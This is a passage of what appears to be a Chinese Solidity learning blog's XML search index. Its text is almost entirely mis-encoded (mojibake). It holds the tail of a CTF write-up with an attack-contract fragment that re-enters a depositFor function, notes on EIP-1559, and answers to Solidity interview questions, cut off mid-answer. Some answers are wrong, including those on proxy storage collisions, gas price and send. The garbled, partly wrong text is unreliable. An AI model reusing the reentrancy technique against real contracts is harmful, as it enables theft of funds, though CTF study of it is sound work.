ä¸ºæ˜¯Valueå‘èµ·çš„å­˜é’±            transfer(msg.sender,amount1);            //æ‰§è¡Œé‡å…¥ï¼Œå†æ¬¡å­˜æ¬¾            token.depositFor(address(this),amount1,address(this));                     &#125;    &#125; &#125;ç®€å•æ¥è¯´ï¼Œå°±æ˜¯æˆ‘ä»¬çš„æ”»å‡»åˆçº¦æ‰®æ¼”ä¸€ä¸ªERC20ä»£å¸åˆçº¦ï¼Œæ­£æ˜¯ç”±äºdepoistForå‡½æ•°å°†tokenåœ°å€ä½œä¸ºå‚æ•°ï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½æ”¹å˜tokenåœ°å€é‡Œçš„transferFromå‡½æ•°çš„å†…å®¹ï¼Œè¿›è¡Œé‡å…¥æ”»å‡»,ä¸ªäººè®¤ä¸ºå°±æ˜¯æœ‰ä¸€ä¸ªè·¨åˆçº¦çš„é‡å…¥æ”»å‡»ï¼Œå¯¹äºERC20ä»£å¸å¿…é¡»è¦æœ‰äº†è§£ã€‚å®Œæˆã€‚</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EIP-1559</title>
      <link href="/2024/10/20/EIP-1559/"/>
      <url>/2024/10/20/EIP-1559/</url>
      
        <content type="html"><![CDATA[<h2 id="EIP-1559"><a href="#EIP-1559" class="headerlink" title="EIP-1559"></a>EIP-1559</h2><p>åœ¨åšsolidityè‡ªæˆ‘æ£€æµ‹çš„æ—¶å€™,ç¬¬ä¸€æ¬¡,äº†è§£åˆ°è¿™ä¸ªåè®®,å°±æ¥åšä¸ªå­¦ä¹ ç¬”è®°</p><h1 id="å«ä¹‰"><a href="#å«ä¹‰" class="headerlink" title="å«ä¹‰"></a>å«ä¹‰</h1><p>é¦–å…ˆå®ƒæ˜¯ç”±Vç¥å’ŒEthhub_ioåˆ›å§‹äººEric Conneräº2019å¹´3æœˆè”åˆæå‡ºçš„ä»¥å¤ªåŠäº¤æ˜“æ‰‹ç»­è´¹æœºåˆ¶æ”¹è¿›ææ¡ˆã€‚è¿™ä¸ªææ¡ˆçš„ä¸»è¦å†…å®¹å°±æ˜¯å¯¹å‘çŸ¿å·¥çš„æ”¯ä»˜çš„gasæ–¹å¼åšå‡ºäº†æ”¹å˜,å®ƒå°†gasè´¹åˆ†ä¸ºä¿©éƒ¨åˆ†:åŸºç¡€è´¹(basefee)+çŸ¿å·¥å°è´¹</p><p>åŸºç¡€è´¹(basefee)å°±æ˜¯ä»¥å¤ªåŠç½‘ç»œæ ¹æ®äº¤æ˜“éœ€æ±‚å’ŒåŒºå—å¤§å°åŠ¨æ€è°ƒæ•´çš„ã€‚<code>BASEFEE</code>çš„è®¡ç®—æ–¹å¼æ˜¯é€šè¿‡ä¸€ä¸ªåä¸ºâ€œåŸºç¡€è´¹ç”¨è¿½è¸ªå™¨â€çš„ç®—æ³•æ¥å®ç°çš„ã€‚è¯¥ç®—æ³•ä¼šæ ¹æ®å½“å‰åŒºå—çš„äº¤æ˜“éœ€æ±‚å’ŒåŒºå—å¤§å°æ¥åŠ¨æ€è°ƒæ•´<code>BASEFEE</code>ï¼Œä»¥ç¡®ä¿äº¤æ˜“èƒ½å¤Ÿåœ¨åˆç†çš„æ—¶é—´å†…å¾—åˆ°ç¡®è®¤ã€‚</p><p>EIP-1559åè®®çš„æ ¸å¿ƒæ€æƒ³å…¶å®æœ‰ä¸¤å—ï¼šç¬¬ä¸€å—æ˜¯å˜æ›´ç‡ƒæ–™è´¹ä»·æ ¼çš„å®šä»·æ–¹å¼ï¼Œé™ä½æ•´ä½“çš„ç‡ƒæ–™è´¹ä»·æ ¼ï¼Œä»¥åˆ©äºä»¥å¤ªåŠç”Ÿæ€ä¸­çš„å„ç§åº”ç”¨çš„å‘å±•ã€‚ç¬¬äºŒå—æ˜¯åŸæ¥çš„ä»¥å¤ªåŠç½‘ç»œä¸­çš„ç‡ƒæ–™è´¹å…¨éƒ¨æ˜¯çŸ¿å·¥çš„æ”¶å…¥ï¼Œåœ¨EIP-1559åè®®å®æ–½åï¼Œç‡ƒæ–™è´¹çš„ä¸€éƒ¨åˆ†å°†ç‡ƒçƒ§æ‰ï¼Œä¸å†ä½œä¸ºçŸ¿å·¥çš„æ”¶å…¥ã€‚</p><h2 id="ä½œç”¨"><a href="#ä½œç”¨" class="headerlink" title="ä½œç”¨"></a>ä½œç”¨</h2><p>é™ä½ä»¥å¤ªåŠçš„çŸ¿å·¥è´¹ç”¨,ç»´æŒä»¥å¤ªåŠç½‘ç»œçš„ç¨³å®š</p>]]></content>
      
      
      
        <tags>
            
            <tag> åè®® </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>solidityqestionç­”æ¡ˆ</title>
      <link href="/2024/10/20/solidityqestion%E7%AD%94%E6%A1%88/"/>
      <url>/2024/10/20/solidityqestion%E7%AD%94%E6%A1%88/</url>
      
        <content type="html"><![CDATA[<h2 id="è‡ªæŸ¥"><a href="#è‡ªæŸ¥" class="headerlink" title="è‡ªæŸ¥"></a>è‡ªæŸ¥</h2><p>æœ€è¿‘å‘ç°ä¸ªå…³äºsolidityé¢è¯•çš„é—®é¢˜ç½‘ç«™ï¼Œæ­£å¥½ä¹‹å‰åˆé‡æ–°æ¸©ä¹ äº†solidityçš„ï¼Œæ‰€ä»¥å°±æ¥åšä¸€ä¸‹<br><a href="https://www.rareskills.io/post/solidity-interview-questions">ç‚¹å‡»</a>æŸ¥çœ‹é¢è¯•é—®é¢˜ç½‘ç«™</p><h3 id="å®¹æ˜“"><a href="#å®¹æ˜“" class="headerlink" title="å®¹æ˜“"></a>å®¹æ˜“</h3><p>1ï¼Œç§æœ‰ã€å†…éƒ¨ã€å…¬å…±å’Œå¤–éƒ¨å‡½æ•°ä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</p><ul><li><code>private</code>è¡¨ç¤ºåªèƒ½åœ¨åˆåŒå†…éƒ¨è°ƒç”¨å…¶ä»–å‡½æ•°ã€‚ <code>internal</code>ç±»ä¼¼äºç§æœ‰å…³é”®å­—ï¼Œä½†ä¹Ÿå¯ç”±ç»§æ‰¿å½“å‰åˆåŒçš„åˆåŒè°ƒç”¨ã€‚ <code>external</code>åªèƒ½åœ¨åˆåŒå¤–éƒ¨è°ƒç”¨ã€‚<code> public</code>å¯åœ¨ä»»ä½•åœ°æ–¹è¢«è°ƒç”¨ï¼Œæ— è®ºæ˜¯å†…éƒ¨è¿˜æ˜¯å¤–éƒ¨ã€‚</li></ul><p>2ï¼Œæ™ºèƒ½åˆçº¦å¤§çº¦å¯ä»¥æœ‰å¤šå¤§ï¼Ÿ</p><ul><li>24KB</li></ul><p>3ï¼Œcreate å’Œ create2 æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</p><ul><li>é¦–å…ˆå®ƒä»¬éƒ½æ˜¯Solidityä¸­é‡è¦çš„æ“ä½œç ï¼Œéƒ½æ˜¯ç”¨æ¥éƒ¨ç½²åˆçº¦çš„ï¼ŒåŒºåˆ«å°±æ˜¯ï¼Œ<strong>create</strong>æ˜¯é€šè¿‡å¯¹å‘é€è€…åœ°å€å’Œnonceå€¼è¿›è¡Œå“ˆå¸Œè¿ç®—è®¡ç®—æ–°åˆçº¦çš„åœ°å€çš„ï¼Œ<code>keccak256(rlp.encode(deployingAddress, nonce))</code>ã€‚è€Œ<strong>create2</strong>æ›´ä¸ºå¤æ‚ï¼Œå®ƒä½¿ç”¨æ˜¯é€šè¿‡ä¸€ä¸ªå…¬å¼è®¡ç®—æ–°åˆçº¦çš„åœ°å€çš„ï¼Œè¿™ä¸ªå…¬å¼åŒ…æ‹¬ï¼Œå‘é€è€…åœ°å€ï¼Œéšæœºæ•°ï¼Œsaltï¼Œå­—èŠ‚ç ç­‰å‚æ•°ï¼Œ<code>keccak256(0xff ++ deployingAddr ++ salt ++ keccak256(bytecode))</code>ï¼Œå®ƒä¹Ÿæœ‰ä¸ªä¼˜ç‚¹ï¼Œå¯ä»¥åœ¨éƒ¨ç½²åˆçº¦ä¹‹å‰é¢„æµ‹åˆçº¦åœ°å€ã€‚</li></ul><p>4ï¼ŒSolidity 0.8.0 ç‰ˆæœ¬å¯¹ç®—æœ¯è¿ç®—æœ‰ä»€ä¹ˆé‡å¤§å˜åŒ–ï¼Ÿ</p><ul><li>é‡Œé¢æœ‰å¯¹æ•´æ•°æº¢å‡ºåšå‡ºäº†ä¸€ä¸ªä¿æŠ¤</li></ul><p>5ï¼Œä»£ç†éœ€è¦å“ªç§ç‰¹æ®Šçš„ <code>CALL</code> æ‰èƒ½å·¥ä½œï¼Ÿ</p><ul><li>ä¸€èˆ¬æ¥è¯´æ˜¯ï¼š<code>delegatecall</code>ï¼Œå› ä¸ºå®ƒä¸»è¦ç”¨äºå§”æ‰˜è°ƒç”¨ï¼Œå…è®¸æˆ‘ä»¬åœ¨ä¸»åˆçº¦çš„ä¸Šä¸‹æ–‡ä¸­åŠ è½½å’Œè°ƒç”¨å¦ä¸€ä¸ªåˆçº¦çš„ä»£ç ã€‚è¢«è°ƒç”¨åˆçº¦çš„ä»£ç è¢«æ‰§è¡Œï¼Œä½†è¢«è°ƒç”¨åˆçº¦æ‰€åšçš„ä»»ä½•çŠ¶æ€æ”¹å˜å®é™…ä¸Šæ˜¯åœ¨ä¸»åˆçº¦çš„å­˜å‚¨ä¸­è¿›è¡Œçš„ï¼Œè€Œä¸æ˜¯åœ¨è¢«è°ƒç”¨åˆçº¦çš„å­˜å‚¨ä¸­</li></ul><p>6ï¼Œåœ¨ EIP-1559 ä¹‹å‰ï¼Œå¦‚ä½•è®¡ç®—ä»¥å¤ªåŠäº¤æ˜“çš„æˆæœ¬ï¼Ÿ</p><blockquote><p><code>Ethereum Improvement Proposal (EIP) 1559</code>æ˜¯ä»¥å¤ªåŠçš„ä¸€ä¸ªå‡çº§ï¼Œæ—¨åœ¨æ”¹å˜ä»¥å¤ªåŠè®¡ç®—å’Œå¤„ç†ç½‘ç»œäº¤æ˜“è´¹ç”¨ï¼ˆç§°ä¸ºâ€œgasè´¹ç”¨â€ï¼‰çš„æ–¹å¼ã€‚è¯¥å‡çº§é€šè¿‡ä½¿ç”¨åŸºäºåŒºå—çš„åŸºç¡€è´¹ç”¨<code>basefee</code>å’Œå‘é€æ–¹æŒ‡å®šçš„æœ€å¤§è´¹ç”¨ï¼Œè€Œä¸æ˜¯å¯¹gasä»·æ ¼è¿›è¡Œç«ä»·ï¼Œæ¥æ›´åŠ å¹³è¡¡åœ°æ¿€åŠ±çŸ¿å·¥åœ¨é«˜æˆ–ä½ç½‘ç»œæ‹¥å¡æœŸé—´è¿›è¡ŒæŒ–çŸ¿ï¼Œä»è€Œä½¿ä»¥å¤ªåŠäº¤æ˜“æ›´åŠ é«˜æ•ˆã€‚EIP-1559æ˜¯ä¸€ä¸ªææ¡ˆï¼Œå®ƒæ”¹å˜äº†gasè´¹ç”¨çš„ç»“æ„å’ŒçŸ¿å·¥çš„å¥–åŠ±æ–¹å¼ã€‚è¯¥ææ¡ˆäº2021å¹´8æœˆ5æ—¥ä½œä¸ºä»¥å¤ªåŠä¼¦æ•¦ç¡¬åˆ†å‰çš„ä¸€éƒ¨åˆ†å®æ–½ã€‚<br>gasè´¹ &#x3D; åŸºç¡€è´¹ï¼ˆ<code>Basefee</code>ï¼‰+ çŸ¿å·¥è´¹ï¼ˆTipï¼‰ï¼ŒåŸºç¡€è´¹ä¼šæ ¹æ®åŒºå—çš„Gasåˆ©ç”¨ç‡åŠ¨æ€è°ƒæ•´ï¼Œå¦‚æ¯ä¸ªåŒºå—çš„Gasè´¹åˆ©ç”¨ç‡ä½äº50%ï¼Œå°±é™ä½æ‰‹ç»­è´¹ï¼Œé«˜äº50%ï¼Œå°±æé«˜æ‰‹ç»­è´¹ã€‚</p></blockquote><ul><li>å…³äº<a href="https://learnblockchain.cn/article/6914">EIP-1559</a>,å¯ä»¥æŸ¥çœ‹ã€‚ä»¥ä»¥å¤ªåŠçš„äº¤æ˜“æˆæœ¬æœ‰çŸ¿å·¥é€šè¿‡æ‹å–æœºåˆ¶æ¥å†³å®šçš„ï¼ŒçŸ¿å·¥ä¼šé€‰å‡ºä»·é«˜çš„äº¤æ˜“ï¼Œå¹¶å°†å…¶åŒ…å«åœ¨ä¸‹ä¸€ä¸ªåŒºå—ä¸Šï¼Œäº¤æ˜“æˆæœ¬ï¼Œåˆä¿©ä¸ªå› ç´ å†³å®šï¼ŒGasPriceå’Œ<code>Gas Limit</code>,<code>Gas Price</code>æ˜¯ä»¥å¤ªåŠç½‘ç»œä¸­çš„ä¸€ç§è®¡é‡å•ä½ï¼Œç”¨äºè¡¡é‡äº¤æ˜“çš„å¤æ‚æ€§ã€‚<code>Gas Limit</code>æ˜¯æŒ‡äº¤æ˜“å¯ä»¥ä½¿ç”¨çš„æœ€å¤§Gasæ•°é‡ã€‚äº¤æ˜“çš„æˆæœ¬ç­‰äº<code>Gas Price</code>ä¹˜ä»¥Gas Limitã€‚å› æ­¤ï¼Œäº¤æ˜“çš„æˆæœ¬å–å†³äº<code>Gas Price</code>å’Œ<code>Gas Limit</code>çš„å€¼ï¼Œè¿™äº›å€¼ç”±äº¤æ˜“çš„å‘é€è€…è®¾ç½®ã€‚</li></ul><p>7ï¼Œåœ¨åŒºå—é“¾ä¸Šåˆ›å»ºéšæœºæ•°æœ‰å“ªäº›æŒ‘æˆ˜</p><ul><li>ä¸å¯é¢„æµ‹ï¼Œè€Œä¸”æ¯”è¾ƒå›°éš¾ï¼Œå› ä¸ºæ‰€æœ‰çŸ¿å·¥éƒ½åœ¨ä¸€ä¸ªé“¾ä¸Šï¼Œå®ƒä»¬æœ‰ä¸ªå…±åŒçš„å…±è¯†ï¼Œå¦‚æœéšæ„äº§ç”Ÿä¼ªéšæœºæ•°ï¼Œé‚£ä¹ˆå°±å¯èƒ½ä¼šå¯¼è‡´è¾¾ä¸æˆå…±è¯†ã€‚</li></ul><p>8ï¼Œè·å…°æ‹å–ä¼šå’Œè‹±å›½æ‹å–ä¼šæœ‰ä»€ä¹ˆåŒºåˆ«</p><ul><li>è¿™ä¸ªé—®æ„Ÿè§‰å’Œslidityæ²¡æœ‰å¤ªå¤šå…³ç³»,å°±ä¸å›ç­”äº†</li></ul><p>9,ERC20 ä¸­çš„ å’Œ æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ<code>transfer</code>å’Œ<code>transferFrom</code></p><ul><li><code>transfer</code>æ˜¯ç”¨æˆ·ç›´æ¥å‘é€,<code>transferForm</code>æ˜¯å¯¹äºç”¨æˆ·æˆæƒåœ°å€è¿›è¡Œå‘é€ä»£å¸,ç”¨æˆ·å¯ä»¥ä¸ç”¨ç›´æ¥å‚</li><li><code>transfer(address recipient, uint256 amount)</code></li><li><code>transferFrom(address sender, address recipient, uint256 amount)</code></li><li>ä»ä¸Šé¢çš„è¡¨è¾¾å¼ä¹Ÿèƒ½çœ‹å‡º,<code>transfer</code>æ˜¯ç›´æ¥ä»å½“å‰åˆçº¦è½¬è´¦ç»™ç›®æ ‡åˆçº¦,<code>transferFrom</code>æ˜¯å¯ä»¥è®¾ç½®å‘é€è´¦æˆ·å’Œç›®æ ‡è´¦æˆ·çš„</li></ul><p>10,å“ªä¸ªæ›´é€‚åˆç”¨äºåœ°å€å…è®¸åˆ—è¡¨ï¼šæ˜ å°„è¿˜æ˜¯æ•°ç»„ï¼Ÿä¸ºä»€ä¹ˆ</p><ul><li>æ•°ç»„æ˜¯å¯ä»¥å¿«é€Ÿå†éåœ°å€åˆ—è¡¨,è€Œæ˜ å°„å¯ä»¥å¿«é€ŸæŸ¥æ‰¾åœ°å€æ˜¯å¦åœ¨åœ°å€åˆ—è¡¨ä¸­,æ‰€ä»¥è¦æ ¹æ®å…·ä½“çš„ä½¿ç”¨æƒ…å†µæ¥å†³å®šä½¿ç”¨è°</li></ul><p>11,ä¸ºä»€ä¹ˆä¸åº”è¯¥ä½¿ç”¨ <code>tx.origin</code> è¿›è¡Œèº«ä»½éªŒè¯ï¼Ÿ</p><ul><li><code>tx.origin</code>æ˜¯å‘èµ·äº¤æ˜“çš„çš„äºº,åœ¨ Solidity ä¸­ï¼Œ<code>tx.origin </code>æ˜¯ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œå®ƒè¿”å›å‘é€äº¤æ˜“çš„è´¦æˆ·åœ°å€ã€‚åœ¨åˆçº¦ä»£ç ä¸­ï¼Œæœ€å¸¸ç”¨çš„æ˜¯ä½¿ç”¨ <code>msg.sender </code>æ¥æ£€æŸ¥æˆæƒï¼Œä½†æœ‰æ—¶ç”±äºæœ‰äº›ç¨‹åºå‘˜ä¸ç†Ÿæ‚‰ <code>tx.origin </code>å’Œ <code>msg.sender</code> çš„åŒºåˆ«ï¼Œå¦‚æœä½¿ç”¨äº† <code>tx.origin </code>å¯èƒ½å¯¼è‡´åˆçº¦çš„å®‰å…¨é—®é¢˜ã€‚é»‘å®¢æœ€å…¸å‹çš„æ”»å‡»åœºæ™¯æ˜¯åˆ©ç”¨ <code>tx.origin </code>çš„ä»£ç é—®é¢˜å¸¸ä¸é’“é±¼æ”»å‡»ç›¸ç»“åˆçš„ç»„åˆæ‹³çš„æ–¹å¼è¿›è¡Œæ”»å‡»ã€‚å› ä¸º <code>tx.origin </code>è¿”å›äº¤æ˜“çš„åŸå§‹å‘é€è€…ï¼Œå› ä¸ºæ”»å‡»çš„è°ƒç”¨é“¾å¯èƒ½æ˜¯åŸå§‹å‘é€è€… -&gt; æ”»å‡»åˆçº¦ -&gt; å—æ”»å‡»åˆçº¦ã€‚åœ¨å—æ”»å‡»åˆçº¦ä¸­ï¼Œ<code>tx.origin</code> æ˜¯åŸå§‹å‘é€è€…ã€‚å› æ­¤ï¼Œé€šè¿‡è°ƒç”¨ <code>tx.origin</code> æ¥æ£€æŸ¥æˆæƒå¯èƒ½ä¼šå¯¼è‡´åˆçº¦å—åˆ°æ”»å‡»ã€‚ä¸ºäº†é¿å…è¿™ç§æƒ…å†µï¼Œå»ºè®®ä½¿ç”¨ <code>msg.sender</code> æ¥æ£€æŸ¥æˆæƒ</li></ul><p>12,1 ä¸ªEther ç›¸å½“äº å¤šå°‘ä¸ª gwei ï¼Ÿ</p><ul><li>1 ether &#x3D; 10^9gwei</li></ul><p>13,1 ä¸ªEther ç›¸å½“äº å¤šå°‘ä¸ª wei ï¼Ÿ</p><ul><li>1 ether &#x3D; 10^18wei</li></ul><p>14,<code>assert</code> å’Œ <code>require</code> ä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</p><ul><li><code>require</code> åº”è¯¥è¢«ç”¨äºå‡½æ•°ä¸­æ£€æŸ¥æ¡ä»¶ï¼Œ<code>assert</code>ç”¨äºé¢„é˜²ä¸åº”è¯¥å‘ç”Ÿçš„æƒ…å†µï¼Œå³ä¸åº”è¯¥ä½¿æ¡ä»¶é”™è¯¯ã€‚</li></ul><p>15,ä»€ä¹ˆæ˜¯é—ªç”µè´·ï¼Ÿ</p><ul><li>å°±æ˜¯æ— éœ€æŠµæŠ¼,å°±å¯ä»¥å€Ÿé’±,å…è®¸åœ¨ä¸€ç¬”äº¤æ˜“ä¸­è¿˜æ¬¾</li></ul><p>16,ä»€ä¹ˆæ˜¯ <code>check-effects-interaction</code> æ¨¡å¼ï¼Ÿ</p><ul><li><code>Checks-Effects-Interactions</code>æ¨¡å¼ç¡®ä¿æ‰€æœ‰é€šè¿‡åˆçº¦çš„ä»£ç è·¯å¾„åœ¨ä¿®æ”¹åˆçº¦çš„çŠ¶æ€ï¼ˆ<code>Checks</code>ï¼‰ä¹‹å‰å®Œæˆå¯¹æ‰€æä¾›çš„å‚æ•°çš„æ‰€æœ‰å¿…è¦æ£€æŸ¥ï¼›ç„¶åæ‰å¯¹çŠ¶æ€ï¼ˆ<code>Effects</code>ï¼‰è¿›è¡Œä»»ä½•æ”¹å˜ã€‚ åœ¨æ‰€æœ‰è®¡åˆ’ä¸­çš„çŠ¶æ€å˜åŒ–è¢«å†™å…¥å­˜å‚¨ç©ºé—´ä¹‹åï¼Œå®ƒå¯ä»¥è°ƒç”¨å…¶ä»–åˆçº¦ä¸­çš„å‡½æ•°ï¼ˆ<code>Interactions</code>ï¼‰ã€‚æ£€æŸ¥-ç”Ÿæ•ˆ-äº¤äº’</li></ul><p>17,è¿è¡Œä¸€ä¸ªå•ç‹¬çš„è´¨æŠ¼èŠ‚ç‚¹æ‰€éœ€çš„æœ€ä½ä»¥å¤ªå¸æ•°é‡æ˜¯å¤šå°‘ï¼Ÿ</p><ul><li>32ä¸ªä»¥å¤ªå¸</li></ul><p>18,<code>fallback</code> å’Œ <code>receive</code> ä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</p><ul><li><code>fallback</code>å’Œ<code>receive</code>éƒ½æ˜¯ç‰¹æ®Šçš„å›è°ƒå‡½æ•°ï¼Œç”¨äºå¤„ç†åˆçº¦ä¸­ä¸å­˜åœ¨çš„å‡½æ•°è°ƒç”¨å’Œæ¥æ”¶ä»¥å¤ªå¸ã€‚å®ƒä»¬ä¹‹é—´çš„åŒºåˆ«åœ¨äºï¼Œ<code>fallback</code>å‡½æ•°ä¼šåœ¨è°ƒç”¨åˆçº¦ä¸å­˜åœ¨çš„å‡½æ•°æ—¶è¢«è§¦å‘ï¼Œè€Œ<code>receive</code>å‡½æ•°åªç”¨äºå¤„ç†æ¥æ”¶ä»¥å¤ªå¸ã€‚</li></ul><p>19,å¦‚ä½•å‘æ²¡æœ‰<code>payable </code>å‡½æ•°ã€<code>receive </code>æˆ–å›é€€çš„åˆçº¦å‘é€ä»¥å¤ªï¼Ÿ</p><ul><li>é€šè¿‡è‡ªæ¯åˆçº¦,å°†è‡ªæ¯çš„ethå‘é€ç»™ç›®æ ‡åˆçº¦</li></ul><p>20, <code>view</code> å’Œ <code>pure </code>ä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</p><ul><li><code>view</code>å’Œ<code>pure</code>éƒ½æ˜¯å‡½æ•°çš„ä¿®é¥°ç¬¦ï¼Œviewå¯ä»¥è®¿é—®åˆçº¦ä¸­çš„çŠ¶æ€å˜é‡ï¼Œä¸èƒ½ä¿®æ”¹ï¼›<code>pure</code>ä¸èƒ½è®¿é—®ä¹Ÿä¸èƒ½ä¿®æ”¹çŠ¶æ€å˜é‡ã€‚</li></ul><p>21,è®¿é—®æ§åˆ¶æ˜¯ä»€ä¹ˆï¼Œä¸ºä»€ä¹ˆé‡è¦ï¼Ÿ</p><ul><li>è®¿é—®æ§åˆ¶æ˜¯ä¸€ç§é‡è¦çš„æœºåˆ¶ï¼Œç”¨äºé™åˆ¶å¯¹æ™ºèƒ½åˆçº¦çš„è®¿é—®ã€‚é€šè¿‡ä½¿ç”¨è®¿é—®æ§åˆ¶ï¼Œæ‚¨å¯ä»¥ç¡®ä¿åªæœ‰ç»è¿‡æˆæƒçš„ç”¨æˆ·æ‰èƒ½æ‰§è¡Œç‰¹å®šæ“ä½œæˆ–è®¿é—®æ•æ„Ÿä¿¡æ¯ã€‚è¿™å¯ä»¥å¸®åŠ©ä¿æŠ¤æ‚¨çš„æ™ºèƒ½åˆçº¦å…å—æœªç»æˆæƒçš„è®¿é—®å’Œæ”»å‡»ã€‚Solidityæä¾›äº†å‡ ç§è®¿é—®æ§åˆ¶ä¿®é¥°ç¬¦ï¼Œä¾‹å¦‚<code>public</code>ã€<code>private</code>ã€<code>internal</code>å’Œ<code>external</code>ã€‚è¿™äº›ä¿®é¥°ç¬¦ç”¨äºæ§åˆ¶å‡½æ•°å’ŒçŠ¶æ€å˜é‡çš„å¯è§æ€§å’Œè®¿é—®æƒé™ã€‚</li></ul><p>22, uint256 å¯ä»¥å­˜å‚¨çš„æœ€å¤§å€¼æ˜¯å¤šå°‘ï¼Ÿ</p><ul><li>2^256-1</li></ul><p>23,ä¿®é¥°ç¬¦ï¼ˆmodifierï¼‰çš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿ</p><ul><li>å¢åŠ å¯¹å‡½æ•°çš„é™åˆ¶æˆ–è€…ä¿®é¥°</li></ul><hr><h3 id="ä¸­ç­‰"><a href="#ä¸­ç­‰" class="headerlink" title="ä¸­ç­‰"></a>ä¸­ç­‰</h3><p>1, <code>transfer </code>å’Œ <code>send </code>ä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿä¸ºä»€ä¹ˆä¸åº”è¯¥ä½¿ç”¨å®ƒä»¬ï¼Ÿ</p><ul><li><code>transfer</code>å’Œ<code>send</code>å‡½æ•°éƒ½æ˜¯ç”¨äºå°†ä»¥å¤ªå¸ä»ä¸€ä¸ªåœ°å€è½¬ç§»åˆ°å¦ä¸€ä¸ªåœ°å€çš„å‡½æ•°ã€‚å®ƒä»¬ä¹‹é—´çš„åŒºåˆ«åœ¨äºå®ƒä»¬çš„<code>gas</code>é™åˆ¶ä¸åŒï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´ä¸€äº›å®‰å…¨é—®é¢˜ã€‚å› æ­¤ï¼Œæ‚¨åº”è¯¥ä½¿ç”¨<code>call</code>å‡½æ•°æ¥è½¬ç§»ä»¥å¤ªå¸,ä½†æ˜¯ä¼šæœ‰é‡å…¥æ”»å‡»é£é™©ã€‚<blockquote><p>ï¼ˆtransferå‡½æ•°çš„gasé™åˆ¶ä¸º2300 gasï¼Œè¿™æ„å‘³ç€å¦‚æœæ¥æ”¶æ–¹åˆçº¦æ²¡æœ‰å®ç°fallbackå‡½æ•°ï¼Œæˆ–è€…fallbackå‡½æ•°æ¶ˆè€—çš„gasè¶…è¿‡äº†2300ï¼Œé‚£ä¹ˆè½¬è´¦å°†å¤±è´¥å¹¶å›æ»šæ‰€æœ‰æ›´æ”¹ã€‚è¿™å¯ä»¥é˜²æ­¢é‡å…¥æ”»å‡»ï¼Œä½†ä¹Ÿå¯èƒ½å¯¼è‡´ä¸€äº›é—®é¢˜ï¼Œä¾‹å¦‚æ— æ³•å‘æŸäº›åˆçº¦å‘é€ä»¥å¤ªå¸ã€‚<br>sendå‡½æ•°çš„gasé™åˆ¶ä¹Ÿä¸º2300 gasï¼Œä½†å®ƒè¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ï¼ŒæŒ‡ç¤ºè½¬è´¦æ˜¯å¦æˆåŠŸã€‚å¦‚æœè½¬è´¦å¤±è´¥ï¼Œå®ƒå°†è¿”å›falseã€‚ä½†æ˜¯ï¼Œå¦‚æœæ¥æ”¶æ–¹åˆçº¦æ²¡æœ‰å®ç°fallbackå‡½æ•°ï¼Œæˆ–è€…fallbackå‡½æ•°æ¶ˆè€—çš„gasè¶…è¿‡äº†2300ï¼Œé‚£ä¹ˆè½¬è´¦å°†å¤±è´¥å¹¶å›æ»šæ‰€æœ‰æ›´æ”¹ã€‚<br>ç”±äºè¿™äº›é™åˆ¶ï¼Œtransferå’Œsendå‡½æ•°å·²ç»è¢«è®¤ä¸ºæ˜¯ä¸å®‰å…¨çš„ï¼Œå› æ­¤ä¸åº”è¯¥ä½¿ç”¨å®ƒä»¬ã€‚ç›¸åï¼Œæ‚¨åº”è¯¥ä½¿ç”¨callå‡½æ•°æ¥è½¬ç§»ä»¥å¤ªå¸ã€‚callå‡½æ•°æ²¡æœ‰gasé™åˆ¶ï¼Œå¯ä»¥å‘ä»»ä½•åœ°å€å‘é€ä»¥å¤ªå¸ï¼Œå¹¶ä¸”å¯ä»¥æŒ‡å®šè¦å‘é€çš„gasæ•°é‡ã€‚ä½†æ˜¯ï¼Œæ‚¨åº”è¯¥å°å¿ƒä½¿ç”¨callå‡½æ•°ï¼Œå› ä¸ºå®ƒå¯èƒ½ä¼šå¯¼è‡´ä¸€äº›å®‰å…¨é—®é¢˜ï¼Œä¾‹å¦‚é‡å…¥æ”»å‡»ã€‚ï¼‰</p></blockquote></li></ul><p>2,ä»£ç†åˆçº¦ä¸­çš„å­˜å‚¨å†²çªæ˜¯ä»€ä¹ˆï¼Ÿ</p><ul><li>å­˜å‚¨å†²çªæ˜¯æŒ‡å¤šä¸ªåˆçº¦å°è¯•è®¿é—®åŒä¸€å­˜å‚¨ä½ç½®æ—¶å‘ç”Ÿçš„é—®é¢˜ã€‚å½“å¤šä¸ªåˆçº¦åŒæ—¶å°è¯•æ›´æ–°åŒä¸€å­˜å‚¨ä½ç½®æ—¶ï¼Œå¯èƒ½ä¼šå‘ç”Ÿå­˜å‚¨å†²çªï¼Œå¯¼è‡´æ•°æ®ä¸ä¸€è‡´æˆ–åˆçº¦æ— æ³•æ­£å¸¸å·¥ä½œã€‚</li></ul><p>3,åœ¨æƒç›Šè¯æ˜ä¹‹å‰åï¼Œ<code>block.timestamp</code> 